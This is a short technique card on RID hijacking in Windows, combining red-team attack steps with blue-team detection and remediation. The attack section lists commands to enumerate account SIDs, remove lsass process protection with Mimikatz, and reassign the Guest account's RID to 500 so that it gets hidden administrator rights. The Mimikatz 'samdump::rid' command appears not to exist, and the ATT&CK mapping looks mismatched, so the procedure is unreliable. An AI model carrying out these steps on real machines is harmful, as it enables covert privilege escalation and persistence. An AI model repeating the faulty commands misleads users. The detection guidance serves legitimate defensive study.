# [PE-TOKEN-005]: RID Hijacking

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-005 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation: Token Impersonation/Theft (T1134.001)](https://attack.mitre.org/techniques/T1134/001/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows Endpoint |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Security Account Manager (SAM) registry hive stores local user information. Each user has a Relative ID (RID) (e.g., Guest=501, Admin=500). If an attacker with SYSTEM privileges modifies the SAM registry keys directly, they can change the RID of a low-privilege user (e.g., Guest) to `500`. When this user logs in, the OS constructs an access token with the Administrator's privileges, even though the username is still "Guest".
- **Attack Surface:** SAM Registry Hive (`HKLM\SAM`).
- **Business Impact:** **Stealthy Local Admin**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** SYSTEM.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - PowerShell

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Current RIDs**
```bash
wmic useraccount get name,sid
```

**Step 2: Hijack (Mimikatz)**
Modify the RID of 'Guest' to 500.
```cmd
!+
!processprotect /process:lsass.exe /remove
samdump::rid /user:Guest /rid:500
```
*(Note: Manual registry editing requires `PsExec -s` to access SAM hive).*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Endpoint Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4670 | Permissions on an object were changed. Filter for `HKLM\SAM\SAM\Domains\Account\Users`. |
| **Sysmon** | 12/13 | Registry Event. Modification of keys under `HKLM\SAM`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **EDR:** Monitor for direct access/modification of the SAM registry hive by non-system processes.
*   **Audit:** Regularly audit local user RIDs using scripts to ensure no duplicate `500` mappings exist.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-TOKEN-001] (Get SYSTEM)
> **Next Logical Step:** [LAT-CLASSIC-001]
